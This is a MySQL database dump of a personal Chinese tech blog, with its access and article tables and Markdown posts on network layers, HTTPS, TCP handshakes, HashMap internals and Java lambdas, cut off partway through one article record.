/*
 Navicat Premium Data Transfer

 Source Server         : localhost
 Source Server Type    : MySQL
 Source Server Version : 80021
 Source Host           : localhost:3306
 Source Schema         : blog

 Target Server Type    : MySQL
 Target Server Version : 80021
 File Encoding         : 65001

 Date: 21/07/2021 23:18:00
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for access
-- ----------------------------
DROP TABLE IF EXISTS `access`;
CREATE TABLE `access`  (
  `id` int(0) NOT NULL AUTO_INCREMENT,
  `ip_address` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户的ip地址',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0),
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 560 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '访问表,用于记录访问量' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for article
-- ----------------------------
DROP TABLE IF EXISTS `article`;
CREATE TABLE `article`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '文章主键id',
  `user_id` int(0) NOT NULL COMMENT '文章属于的前台用户id',
  `title` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '文章的标题',
  `face_cover` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '文章的封面',
  `content` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '文章的内容,存放markdown内容',
  `praise` int(0) NOT NULL DEFAULT 0 COMMENT '文章的网络点赞数,游客也可以点赞',
  `comment_sum` int(0) NOT NULL DEFAULT 0 COMMENT '文章评论数量,用户评论后由消息队列进行更新',
  `browse_sum` int(0) NOT NULL DEFAULT 0 COMMENT '文章访问数量,查看文章后由消息队列进行更新',
  `status` int(0) NOT NULL DEFAULT 0 COMMENT '文章状态.0:可用,1:被删除',
  `weight` int(0) NOT NULL DEFAULT 0 COMMENT '文章的权重,用于排序',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '创建文章的时间',
  `update_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '更新文章的时间',
  `approval` int(0) NOT NULL DEFAULT 0 COMMENT '文章的赞数',
  `oppose` int(0) NOT NULL DEFAULT 0 COMMENT '文章的踩数',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 132 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '文章的数据表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of article
-- ----------------------------
INSERT INTO `article` VALUES (1, 1, '留言', '2018/8/1533868132_aac3042b2ef298ea9be94be9caea6a8d.jpg', '# 留言\n如果你有什么要对我说的，可以在这里进行留言或者联系我\n\n留言板及友链申请页面暂未制作', 0, 0, 575, 0, 0, '2018-08-10 10:31:18', '2019-11-14 10:31:18', 0, 0);
INSERT INTO `article` VALUES (2, 1, '交换友链', '2018/8/1535013644_04d6923d0ad2cbd965b507b18cc5b36f.jpg', '### 申请格式 \n1. 昵称: 纤月\n2. 地址(首页): https://blog.tuwq.cn\n3. 头像地址: https://blog.tuwq.cn/static/image/bloglogo.jpg  \n4. 描述: 愿你永远保持热血与中二\n\n#####  留言板及友链申请页面暂未制作,联系我邮箱发送友链信息', 0, 0, 352, 0, 0, '2018-08-10 10:45:58', '2020-07-31 10:45:58', 0, 0);
INSERT INTO `article` VALUES (3, 1, '博客上线测试', '2018/8/1534323001_db4feeaded993080b5ef03cf3121f42b.jpg', '从7月8日开始搭建博客,至8月24日完成预想功能,本博客前台由React+SpringBoot搭建  \n博客源码 https://github.com/tuwq/blog', 0, 0, 159, 0, 0, '2018-08-10 10:52:37', '2018-08-24 10:52:37', 0, 0);
INSERT INTO `article` VALUES (4, 1, '网络模型基本概述', '2019/10/1570088454_mmexport1570087971618.jpg', '### 网络模型\n```java\n// 为什么要有网络模型\n1. 如果各个电脑厂商，IBM、苹果啥的，都弄自己的协议\n2. 结果就苹果电脑和苹果电脑自己可以通信，苹果电脑和IBM电脑就不可以通信，这不是很离谱吗。\n3. 所以要搞一个国际通行的协议，大家都按照这个来，所有电脑都可以通信。\n4. 这时候就必须搞一个标准的网络模型出来，大家都按照这个来走，大家都要遵守统一的规范。\n5. 这就是所谓OSI七层模型，他们分别是：应用层、表示层、会话层、传输层、网络层、数据链路层、物理层。\n6. 在这个基础上，又简化出了TCP/IP四层模型，数据链路层、网络层、传输层、应用层。\n\n```\n### 物理层\n![网络模型物理层.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624609209_网络模型-物理层.png)\n```java\n// 物理层\n1. 物理层就是说电脑之间要联网,怎么搞,我有台电脑，现在要联网，怎么联 \n2. 以前是在电脑上插根线，然后才能上网,现在联个wifi就行了,还有中国美国联网靠的是海底的光缆。\n3. 所以物理层就指的这个，怎么把各个电脑给立联结起来，形成一个网络，这就是物理层的含义\n4. 物理层负责传输0和1的电路信号\n\n```\n### 数据链路层\n![网络模型数据链路层.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624609209_网络模型-数据链路层.png)\n```java\n// 数据链路层\n1. 物理层把各个电脑连接起来了,传输最底层的0和1电路信号\n2. 关键仅是这些不行啊，你得定义清楚哪些0和1分为一组，这些信号是啥意思？这才能进行通信。\n3. 数据链路层就干这事儿，定义一下电路信号咋分组。\n0000001100101010101\n拆分为多组\n00000011 00101 0101 01\n5. 一组电信号是一个数据包，叫一个帧（frame），每个帧分成两个部分，标头（head）和数据（data），标头包含一些说明性的东西，比如说发送者、接收者和数据类型之类的。\n6. 每台电脑要往另外一台电脑发送数据，一堆0/1电路信号，封装成数据包，包含头和数据，头里包含了从哪儿来到哪儿去\n7. 必须从一台电脑的一个网卡，发送到另外一个电脑的一个网卡所以以太网发送的数据包必须得指定，目标电脑的网卡的mac地址。\n8. 以太网规定了，每个网卡必须得包含一个mac地址，mac地址就是这个网卡的唯一标识，\n9. 接入网络里的所有设备，都得有个网卡，以太网协议里的那个数据包，在数据链路层传输的数据包，必须从一个电脑的网卡传输到另外一个电脑的网卡，而这个网卡地址就叫做所谓的mac地址。\n10. 每块网卡出厂的时候，就有一个唯一的mac地址，48位的二进制，但是一般用12个16进制数字表示，前6个16进制是厂商编号，后6个16进制是网卡流水号。\n11. 在以太网里传输数据包的时候，必须指定接收者的mac地址才能传输数据。\n \n// 以太网的数据包怎么从一个mac地址发送到另一个mac地址？\n1. 这个不是精准推送的，以太网里面，如果一个电脑发个数据包出去，会广播给局域网内的所有电脑设备的网卡，然后每台电脑都从数据包里获取接收者的mac地址，跟自己的mac地址对比一下，如果一样，就说明这是发给自己的数据包。\n2. 这种广播的方式，仅仅针对一个子网（局域网）内的电脑，会广播，否则一个电脑不能广播数据包给全世界所有的其他电脑吧，是仅仅广播给一个子网里面的电脑的。\n\n// 网络交换机\n1. 网络交换机是工作在数据链路层的设备\n2. 网络交换机是通过mac地址来寻址和传输数据包的\n3. 网络交换机主要用在局域网的通信，一般你架设一个局域网，里面的电脑通信是通过数据链路层发送数据包，通过mac地址来广播的，广播的时候就是通过网络交换机这个设备来把数据广播到局域网内的其他机器上去的\n\n```\n### 网络层\n![网络模型网络层.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624609209_网络模型-网络层.png)\n```java\n// 网络层\n网络层，是基于ip协议，进行主机和主机间的寻址和通信的\n1. 子网内的电脑，通过以太网发个数据包，对局域网内的电脑，是广播出去的。\n2. 那么怎么知道哪些电脑在一个子网内呢？这就得靠网络层了，这里就有一套IP地址，IP地址就可以让我们区分哪些电脑是一个子网的。\n3. 网络层里有IP协议，IP协议定义的地址就叫做IP地址。\n4. IP地址有IPv4和IPv6两个版本，目前广泛使用的是IPv4，是32个二进制数字组成的，但是一般用4个十进制数字表示，范围从0.0.0.0到255.255.255.255之间。\n5. 每台计算机，都会分配一个ip地址，ip地址的前24位（就是前面3个十进制数字），代表了网络，后8位（就是最后1个十进制数字），代表了主机。\n6. 如果几台电脑是一个子网的，那么前面的3个十进制数字一定是一样的。\n比如自己win上开几个linux虚拟机，你会发现，win上的ip地址可能是192.168.0.103，然后几个虚拟机的ip地址是192.168.100.101，192.168.100.107，1192.168.100.156，类似这样的。\n这个win机器和几个虚拟机，前面3个十进制数字都是192.168.100，就代表大家是一个子网内的，最后那个数字是这个子网的不同主机的编号。\n\n// 子网掩码\n1. 但是实际上单从ip地址是看不出来哪些机器是一个子网的，因为从10进制是判断不出来的。需要通过ip地址的二进制来判断，结合一个概念来判断，叫做子网掩码。\n2. 如果要判断两个ip地址是不是一个子网的，将源 IP 与目的 IP 分别同这个子网掩码进行与运算，相等则是在一个子网，不相等就是在不同子网，就这么简单。\n电脑A: 192.168.100.100 & 255.255.255.0 = 192.168.100.0\n电脑B: 192.168.100.102 & 255.255.255.0 = 192.168.100.0\n电脑C: 192.168.102.100 & 255.255.255.0 = 192.168.102.0\n电脑D: 192.168.102.109 & 255.255.255.0 = 192.168.102.0\nA与B在同一个子网，C与D在同一个子网，但是A与C就不在同一个子网，与D也不在同一个子网\n有了网络层的ip地址之后，两台在子网内的电脑终于可以通过广播+mac地址判断来传输数据包进行通信了。\n\n// 路由器\n1. 路由器是工作在网络层的设备。\n1. 如果发现要接受数据包的计算机不在子网内，那么就不能通过广播来发送数据包，需要通过路由来发送数据包。\n2. 路由器负责将多个子网进行连接进行处理\n4. 路由器虽然有mac地址，但是不能通过mac地址寻址的，必须通过ip地址寻址\n5. 路由器是通过ip地址寻址和传输数据包的\n6. 路由器一般用来让你连入英特网\n\n// 两个局域网之间，通过一个路由器进行通信的\n1. 路由器配置了两块网卡，每个网卡可以连到一个局域网内\n2. 局域网A内的电脑，要发送数据包到局域网B内的电脑，在数据包里写上自己的ip地址和对方的ip地址。\n3. 因为他们俩不在一个局域网内，所以局域网A内的电脑，先通过交换机将数据包发送给路由器，这个过程需要将路由器的一块网卡的ip地址对应的mac地址写到数据包的头部，然后才能通过交换机广播出去，路由器接收到之后比较自己一块网卡的mac地址，就知道是来找自己的。\n4. 接着路由器接收到数据包之后，就会在局域网B内，将目标机器的ip地址对应的mac地址写入头部，接着再次通过交换机发送广播通知，发送给局域网B内的电脑。\n5 一个局域网内的每台机器都有自己的ARP cache，这个ARP就是用来在一个局域网内让各个设备都知道每个设备的ip地址和mac地址的对应关系的，一般就是某个机器发送广播通知自己的ip地址和mac地址的对应关系，然后每个机器给他一个回应。以此类推，大家都互相这样广播，ip地址和mac地址的对应关系大家都知道了\n6. 一个子网内的机器之间通信，就是在数据包里写上对方的mac地址，然后交换机广播出去ok了；但是如果是跨子网的通信，就是写上对方的ip地址，然后先通过mac地址广播到路由器，让路由器再根据另外一个子网的ip地址转换为mac地址，通过另外一个子网的交换机广播过去。\n\n// arp 协议\n1. 发送数据包的数据链路层需要知道 MAC 地址，可是我只知道 IP 地址该怎么办呢？\n2. 在网络层，我需要把 IP 地址对应的 MAC 地址找到，也就是通过某种方式，找到 192.168.120.102 对应的 MAC 地址 EEE。\n3. arp 协议就是电脑里面会有一张 arp 缓存表，表中记录着 IP 与 MAC 地址的对应关系\n4. 一开始的时候这个表是空的，电脑 A 为了知道电脑 B（192.168.100.102）的 MAC 地址，将会广播一条 arp 请求，B 收到请求后，带上自己的 MAC 地址给 A 一个响应。此时 A 便更新了自己的 arp 表。\n5. 这样通过大家不断广播 arp 请求，最终子网内所有电脑里面都将 arp 缓存表更新完整。\n\n// LAN和WLAN\nLAN，就是local area network，就是局域网；WAN，就是wide area network，就是广域网。\nWLAN是wireless local area network，就是无线局域网，也就是wifi，在局域网内，直接通过wifi无线联网。\n家里的路由器是包含了交换机和路由的两个功能的，如果是连接到局域网内的设备就把线插LAN那儿；如果是连接到英特网，就把线插在WAN那儿。\n每个电脑都可以搞多个网卡的，不是只有一个网卡，一般笔记本电脑都有以太网网卡和wifi网卡，发送数据包的时候要决定走哪个网卡。\n路由器，其实就是配置了多个网卡的一个专用设备，可以通过不同的网卡接入不同的网络。\n\n// ip地址,子网掩码,路由器网关地址\n网络设置，一般包含了ip地址、子网掩码、网关地址、DNS地址。\nip地址和子网掩码用来划分子网的，判断哪些ip地址在一个子网内。\nip地址和mac地址关联起来的，唯一定位了网卡。\n路由器的网卡也有mac地址，mac地址对应了一个ip地址。\n\n// DNS地址\n我们一般定位是通过ip地址+mac地址+端口号来定位一个通信目标的\n但是如果在浏览器上输入一个www.baidu.com\n这个时候是先把www.baidu.com发给DNS服务器，然后DNS服务器告诉你www.baidu.com对应的ip地址的。\n\n```\n### 传输层\n![网络模型传输层.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624609209_网络模型-传输层.png)\n```java\n// 传输层\n1. 尽管电脑们在不同子网下也可以通信了\n2. 但是这里还有一个问题，就是一台机器上，是很多个程序用一个网卡进行网络通信的，比如说浏览器、QQ、视频直播，这些软件都用了一个网卡往外面发送数据，然后从网卡接收数据\n4. 所以还需要一个端口号的概念，就是你得发送数据包到某个机器的一个网卡的某个端口上去，然后那个机器上监听那个端口的程序，就可以提取发送到这个端口的数据，知道是自己的数据。\n5. 端口号是0~65536的范围内，0~1023被系统占用了，别的应用程序就用1024以上的端口就ok了\n\n电脑A，在端口8080监听，通过网卡发送了一条数据到电脑B的ip地址的9090这个端口\n电脑B的上面的某个QQ，监听着9090的端口\n电脑B的网卡接收到一条数据之后，发现人家找的是9090这个端口，发现QQ在监听这个端口，我就把这个网卡过来的数据，传递给QQ\n\n传输层，是建立某个主机的某个端口，到另外一个主机的某个端口的连接和通信的。\n这个通信，就是通过socket来实现的，通过socket就可以基于tcp/ip协议完成一系列的操作\nudp和tcp都是传输层的协议，作用就是在数据包里加入端口号，可以通过端口号进行点对点的通信了。\nudp协议是不可靠的，发出去人家收到没有就不知道了；tcp协议是可靠的，要求三次握手，而且要求人家接收到数据必须回复你。\n传输层的tcp协议，仅仅只是规定了一套基于端口的点对点的通信协议，包括如何建立连接，如何发送和读取消息，但是实际上如果你要基于tcp协议来开发，一般是用socket网络编程\n\n```\n### 应用层\n![网络模型应用层.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624609209_网络模型-应用层.png)\n```java\n1. 通过传输层的tcp协议可以传输数据，但是收到数据之后，怎么来解释\n2. 比如说收到个邮件你怎么处理？收到个网页你怎么处理？\n类似这个意思，所以针对各种不同的应用，邮件、网页之类的，都是定义不同的应用层协议的。\n这个应用层，假设综合了会话层、表示层和应用层了，3层合成1层。\n最常见的应用层的协议就是http协议，进行网络通信。\n\n```\n### 访问网站的基本过程\n![网络模型访问一个网站的过程.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624611112_网络模型-访问一个网站的过程.png)\n```java\n1. 浏览器进入www.baidu.com\n2. 去dns服务器上获取www.baidu.com这个域名的ip地址\n3. 电脑通过子网掩码算出ip地址不在一个子网内,于是传递到网关路由器,网关通过路由表不断找符合ip的网关端口,可能会经过许多的网关路由\n4. 找到符合ip的网关路由后,路由器会根据arp协议的arp缓存表中ip与mac地址的关联关系,找到实际百度服务器172.196.24.107的mac地址\n5. 发送过去给百度服务器,百度服务器层层的解析请求数据包,得到http的数据报文,交给应用服务器处理\n6. 应用服务器处理完毕后,将数据返回\n\n```', 0, 0, 74, 0, 0, '2018-08-10 17:41:09', '2019-07-19 17:41:09', 0, 0);
INSERT INTO `article` VALUES (5, 1, 'https的加密通信', '2018/8/1533901545_4e9baa94c630dc8cc899fcb189319580.jpg', '### http基本概述\n```java\n(1) http是网络模型中应用层的协议,是常用协议之一\n(2) 它的底层是将http数据封装在tcp数据包，封装在ip数据包，封装在以太网数据包\n(3) 如果过大，可能会拆成几个包，走以太网协议+交换机 -> 广播 -> 网关 -> 多个网关 -> 目标的机器 -> 一层一层拆包 -> http请求报文 -> 传递给应用服务器 -> http响应 -> 然后一样的路径回去\n(4) http请求的报文有请求头、请求方法、请求正文，响应，状态行，响应头，响应正文，状态行等等\n\n// http 1.0\nhttp 1.0要指定keep-alive来开启持久连接，默认是短连接\n短连接就是浏览器每次请求都要重新建立一次tcp连接，做完了就释放tcp连接。\n早期的网页没啥东西，就一点文字，就用这个没问题。但是现在，一个网页打开之后，还要加载大量的图片、css、js，这就要命了\n最慢的不是发送请求和获取响应，而是打开和释放连接,发送多次请求,每次请求都要建立tcp的三次握手\n\n// http 1.1\nhttp 1.1默认支持长连接，就是说，浏览器打开一个网页之后，底层的tcp连接就保持着，不会立马断开，之后加载css、js之类的请求，都会基于这个tcp连接来走。\nhttp 1.1还支持host头，也就可以支持虚拟主机；而且对断点续传有支持。\n浏览器第一次请求去页面的时候，就会打开一个tcp连接，接着就在一段时间内都不关闭了\n然后接下来这个网页加载css、js、图片大量的请求全部走同一个tcp连接，频繁的发送请求获取响应，最后过了一段时间，这些事儿都做完了，然后才会去释放那一个tcp连接。\n相对比1.0的那种短连接,1.1大幅度的提升复杂网页的打开的速度，性能。\n\n// http2.0\nhttp 2.0，支持多路复用，基于一个tcp连接并行发送多个请求以及接收响应，解决了http 1.1对同一时间同一个域名的请求有限制的问题。\n二进制分帧，将传输数据拆分为更小的帧（数据包），frame（数据包，帧），提高了性能，实现低延迟高吞吐。\n\nhttp本身没长连接短连接，都是http下层的tcp连接是长连接还是短连接\nhttp的长短连接，本质上是TCP的socket连接在一次交互完成后是否进行关闭\n\n```\n### https的加密通信\n![httphttps加密通信.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624620250_http-https加密通信.png)\n```java\nhttp协议都是明文的，是没有加密的，所以其实现在一般大部分应用都是用https协议的。\n以前是基于SSL协议对http进行加密，后来又升级到了TSL协议来加密，现在称之为SSL / TSL。\n\n// 工作原理步骤\n(1) 浏览器把自己支持的加密规则发送给网站\n(2) 网站从这套加密规则里选出来一套加密算法和hash算法，然后网站将证书信息给浏览器(网站地址,加密公钥,颁发机构)\n(3) 浏览器验证证书合法性生成一个随机密码\n(4) 将用随机密码对称加密握手消息、生成握手消息hash值、用公钥加密后的随机密码这三样发送给网站\n(5) 网站取出公钥加密后的随机密码，用本地的私钥对消息解密取出来密码，然后用密码解密浏览器发来的握手消息，计算消息的hash值，并验证与浏览器发送过来的hash值是否一致\n(6) 验证后用密码加密一段握手消息，发给浏览器\n(7) 浏览器解密握手消息，然后计算消息的hash值，如果跟网站发来的hash一样，握手就结束，之后所有的数据都会由之前浏览器生成的随机密码，然后用对称加密来进行进行加密。\n\n常用的非对称加密是RSA算法，对称加密是AES、RC4等，hash算法就是MD5\n \n```', 0, 0, 117, 0, 0, '2018-08-10 19:45:51', '2020-02-06 19:45:51', 0, 0);
INSERT INTO `article` VALUES (6, 1, 'tcp的三次握手与四次挥手', '2021/5/1621409021_mmexport1621057542654.jpg', '### 三次握手\n![网络tcp三次握手.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624613851_网络-tcp三次握手.png)\n```java\n// tcp三次握手过程\n建立三次握手的时候，TCP报头用到了下面几个东西，ACK、SYN、FIN\n\n第一次握手，客户端发送连接请求报文，此时SYN=1、ACK=0，这就是说这是个连接请求，seq = x，接着客户端处于SYN_SENT状态，等待服务器响应。\n第二次握手，服务端收到SYN=1的请求报文，需要返回一个确认报文，ack = x + 1，SYN=1，ACK = 1，seq = y，发送给客户端，自己处于SYN_RECV状态。\n第三次握手，客户端收到了报文，将ack = y + 1，ACK = 1，seq = x + 1\n\n其实三次握手说白了，就是来回来去三次请求，每次请求带上一堆TCP报文头，根据报文头是否正确，就是越好的协议来建立连接。简单说就是这样。\n\n// 为啥不是2次或者4次握手呢？\n// 如果是两次握手\n如果客户端第一次握手过去，结果卡在某个地方了，没到服务端；正在路上\n客户端发现没反应所以客户端再次重试发送了第一次握手过去，服务端收到了，ok了,这次建立了连接,并且处理结束了\n过了一会后来那个卡在哪儿的老的第一次握手发到了服务器，服务器直接就返回一个第二次握手，\n这个时候服务器开辟了资源准备等客户端发送数据，结果客户端根本就不会理睬这个发回去二次握手,白白造成资源浪费\n\n// 如果是三次握手\n二次握手发回去，客户端发现根本不对，就会发送个复位的报文过去，让服务器撤销开辟的资源，别等着了,把资源释放掉。\n\n// 如果是四次握手\n3次握手就够了，不需要4次或者5次浪费资源了。\n\n```\n### 4次挥手\n![网络tcp四次挥手.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624613790_网络-tcp四次挥手.png)\n```java\n第一次挥手，客户端发送报文，FIN=1，seq=u，此时进入FIN-WAIT-1状态\n第二次挥手，服务端收到报文，这时候进入CLOSE_WATI状态，返回一个报文，ACK=1，ack=u+1，seq=v。客户端收到这个报文之后，直接进入FIN-WAIT-2状态，此时客户端到服务端的连接就释放了。\n第三次挥手，服务端发送连接释放报文，FIN=1，ack=u+1，seq=w，服务端进入LAST-ACK状态\n第四次挥手，客户端收到连接释放报文之后，发应答报文，ACK=1，ack=w+1，seq=u+1，进入TIME_WAIT状态，等待一会儿客户端进入CLOSED状态，服务端收到报文之后就进入CLOSED状态。\n\n```', 0, 0, 98, 0, 0, '2018-08-10 18:12:11', '2018-08-10 18:12:11', 0, 0);
INSERT INTO `article` VALUES (7, 1, 'hashMap的基本结构逻辑与扩容逻辑', '2018/8/1533878493_d6b979fdf32e3984dba5bea2555a9c43.jpg', '### 基本结构逻辑\n![HashMap基本逻辑.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624346357_HashMap-基本逻辑.png)\n```java\n(1) hashmap的底层结构是数组\n(2) 比如数据key: 张三,value: 1,那么会通过对该key的hash优化,并根据底层数组的长度进行计算\n(3) 计算后会得到一个该数组的下标,那么该数据就会插入到该下表的数组中去\n\n// 对key的hash进行hash算法优化\n// JDK 1.8以后的HashMap里面的一段源码\nstatic final int hash(Object key) {\n        int h;\n        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);\n}\n// 将原key的hash值与右移16位的值(也就是65535)进行异或运算得出新的一个hash值,这个hash值被称为key优化后的hash值\n// 与65535进行异或运算优化\n// 比如key的原hash值为\n1111 1111 1111 1111 1111 1010 0111 1100\n// 右移16位的hash值,相当于2的16次方的值,也就是65535的二进制\n0000 0000 0000 0000 1111 1111 1111 1111\n// 异或运算得出,这个值被称为被优化后的key值\n1111 1111 1111 1111 0000 0101 1000 0011\n\n// 得出优化后的hash后接下来得出下标地址\n// 寻址算法优化\n(n - 1) & hash\nn表示数组长度,如hashmap的table数组默认16位长度,则n-1=15,将15和优化后的hash值进行 与运算 得出的hash值为寻址地址的hash值,也就是下标值\n\n// 经过之前与65535异或优化后hash值\n1111 1111 1111 1111 0000 0101 1000 0011\n// n - 1的值,n=16,那么n-1=15,15的二进制\n0000 0000 0000 0000 0000 0000 0000 1111\n// 将两者进行与运算,得出寻址地址hash值,也就是十进制的3,该值就是该数据插入数组的下标值位置\n0000 0000 0000 0000 0000 0000 0000 0011\n\nhash & (n - 1) 的效果是跟直接进行优化后hash对n取模，效果是一样的，但是与运算的性能要比hash对n取模要高很多，数学问题，数组的长度会一直是2的n次方,他保持数组长度是2的n次方\n\n// 两次的hash运算优化\n// key的hash算法的优化\n(1) 让每个key的hash值,在它的低16位中,让高低16位进行了异或\n(2) 让他的低16位同时保持了高低16位的特征,,尽可能的使不同的key得出hash值尽可能不同,减少因为插入数组的下标一样导致的哈希冲突\n\n// 寻址算法的优化\n(1) 用与运算替代取模从而得出下标值,相比于普通取模,与运算更提升性能\n\n如果两个key最后计算的下标hash值一样,它们会插入到数组的同一个下标位置中，这会导致进行复杂的hash冲突的处理\n\n```\n### 哈希冲突\n![HashMap哈希冲突.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624346358_HashMap-哈希冲突.png)\n```java\n// 哈希冲突\n(1) 经过了两次hash运算优化后,两个不同的数据key得出了相同的下标值\n(2) 它们都会插入到数组的同一个下标,这时被称为哈希冲突,也叫哈希碰撞\n\n// 数组下标的结构升级为链表与红黑树\n(1) 比如两个数据的下标值都是3,那么它们都将插入array[3]这个位置,\n(2) 那么会在array[3]这个位置挂一个链表，这个链表里面放入多个key-value对,同时放在数组的一个位置里\n(3) 当get数据时,如果定位到的数组里发现这个下标位置挂了一个链表,此时遍历链表,从里面找到自己的要找的那个key-value对\n(4) 假设已经有了太多的哈希冲突,使得某下标结构的链表很长，可能会导致遍历链表，性能会比较差，O(n)\n(5) jdk做了一次优化,如果链表的长度达到了8的长度(也就是第9个数据)且数组长度大于等于64后，会把链表转换为红黑树，遍历一颗红黑树找一个元素，此时O(logn)，性能会比链表高一些\n(6) 相反,当红黑树中数据量达到6个,那么会将红黑树转换回链表\n\n```\n### 数组扩容逻辑\n![HashMap扩容.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624348605_HashMap-扩容.png)\n```java\n// 扩容\n(1) 数组的长度扩容后,扩容阈值提升为原来的两倍,最大为integer的最大值\n(2) 遍历老数组,将老数组中索引中只有一个的数据节点的节点,会重新(n - 1) & hash计算在新表中的位置并放入新表\n(3) 对索引中有多个数据节点的节点,会根据红黑树还是链表进行重新计算处理并放入新表中\n(4) (e.hash & oldCap)=0 是红黑树与链表计算节点在新表中索引位置的运算逻辑\n(5) oldCap表示的是旧数组的数组长度\n(6) 当计算等于0时,会放入原索引位置\n(7) 当计算不等于0时,会放入原索引+oldCap位置\n\n// 扩容相关属性\nhashmap除了存储数据的节点table数组外,还有一些关于数组扩容的属性\n(1) size: 已存储的数据节点数量\n(2) loadFactor: 负载因子,用于计算得出扩容阀值,默认0.75\n(3) threshold: 扩容阀值,当数组容量达到该值时,触发扩容,扩容阀值 = 容量 * 负载因子\n(4) cap: 存储table数组的长度\n\nthreshold还会被用来存table数组初始化时的容量,也就是,hashmap直到第一次插入节点时,才会对table进行初始化,懒加载避免不必要的空间浪费\n\n负载因子默认0.75\n如果值高,会导致扩容阀值过大,迟迟不进行扩容,导致hash冲突概率增大,增大查找成本\n如果值低,hash冲突概率下降,但是会导致空间会浪费\n\n```', 0, 0, 138, 0, 0, '2018-08-10 13:21:44', '2019-07-23 13:21:44', 0, 0);
INSERT INTO `article` VALUES (8, 1, 'JDK8特性的lambda表达式与函数接口', '2018/8/b855a6c2d725ea2eae86558d74c0acf2.jpg', '### lambda表达式\n```java\n// 即使没有完全学习过lambda，但大多数应该看过lambda表达式的样子,它很像es6中的箭头函数\n// 先简单来个例子\n// 这是传统的创建线程的方式\nnew Thread(new Runnable(){\n	@Override\n	public void run() {\n		System.out.println(\"ok\");\n	} \n}).start() \n// 这是用lambda表达式创建线程的方式\nnew Thread(()-> \n	System.out.println(\"ok\"))\n.start()\n\n// 可以看出非常极简干练,比传统方式不知道高了多少个华莱士\n// 把代码重构仔细看看\n// 传统的方式\nRunnable r1 = new Runnable() {\n	@Override\n	public void run() {\n		System.out.println(\"ok\");\n	}\n}\nnew Thread(r1).start();\n\n// lambda方式\nRunnable target2 = () -> System.out.println(\"ok\");\nnew Thread(target2).start();\n\n// 可以看出lambda表达式返回的是一个Runnable接口\n// 如果你以为只能返回Runnable接口那就错了,它可以返回任意接口\n// 你左边用什么接口接收，它就返回什么接口\n```\n#### 自定义函数接口\n```java\n// 既然什么接口都可以返回，那当然要试一下，我们自己搞一个接口试试\ninterface Interface1 {\n	int intNumber(int i )\n}\npublic class Main {\n	public static void main(String[] args) {\n		Interface i1 = (i) -> i * 2\n		System.out.println(i1.intNumber(18)); // 36\n	} \n} \n// 打印的是36,说明想法是正确的,lamdba表达式可以返回任意的接口，\n那它为什么知道我要调用intNumber方法。*注意!*接收接口有一个前提,这个接口必须*只有一个要被实现的方法*，很明显,我们的接口只有一个intNumber，lambda它当然就只会去找intNumber实现,我们需要把代码添加一些内容\n\n@FunctionalInterface\ninterface Interface1 {\n	// 必须只有一个要实现的方法才能用lambda表达式\n	int intNumber(int i);\n	// 添加第二个要实现的方法,此时编译报错了\n	// int two(int i);\n}\npublic class Main {\n	public static void main(String[] args) {\n		Interface i1 = (i) -> i * 2\n		System.out.println(i1.intNumber(18)); // 36\n		// 下面几种和上面的意思是一样的\n		// 指定参数类型\n		Interface1 i2 = (int i) -> i * 2;\n		// 如果参数只有一个的话,那么可以把括号去掉\n		Interface1 i3 = i -> i * 2;\n		// {}中额外做一些事情,如果不加默认是直接return\n		Interface1 i4 = (int i) -> {\n			System.out.println(\"做一些事\");\n			return i * 2;\n		}; \n	}  \n}\n\n1. @FunctionalInterface这个注解表示这是一个*函数接口*,用来给lambda表达式使用,它*只能有一个要被实现的方法*,它的作用是用来保证*编译校验*\n2. 注意到一开始我们没有加注解,也是可以正常执行的，但是这注解*尽量要加上*\n3. 至于lamdba表达式的变形,你可以参照es6中的*箭头函数*参考,因为lamdba表达式语法和箭头函数语法基本一样\n4. 这种一个接口只有一个要被实现的方法概念被称为*单一责任制*,也就是一个接口只做一个事情\n```\n### 接口的默认实现方法\n```java\n// 接口的默认实现方法，注意!,是*接口默认实现*,接口自己实现了自己的方法\n// 以前的课本书籍告诉我们接口是不能实现方法的,但是现在不一样了,现在接口可以把自己的方法给实现了\ninterface Interface1 {\n	// 默认实现的方法,已经实现了的\n	default int add(int x,int y) {\n		return x + y;\n	}\n	// 默认实现的方法,已经实现了的\n	default int multi(int x,int y) {\n		return x * y;\n	}\n} \nclass Achieve implements Interface1{\n \n}\npublic class Main{\n	public static void main(String[] args) {\n		Interface1 interface = new Achieve();\n		System.out.println(interface.add(1, 8)); // 9\n		System.out.println(interface.multi(8, 8));// 64 \n	}\n}  \n\n1. 可以看到接口的方法前面加一个*defualt*就可以自己把方法给实现了，实现类完全不会被强制要求实现接口方法,这使得我们可以直接使用接口默认实现的方法  \n2. 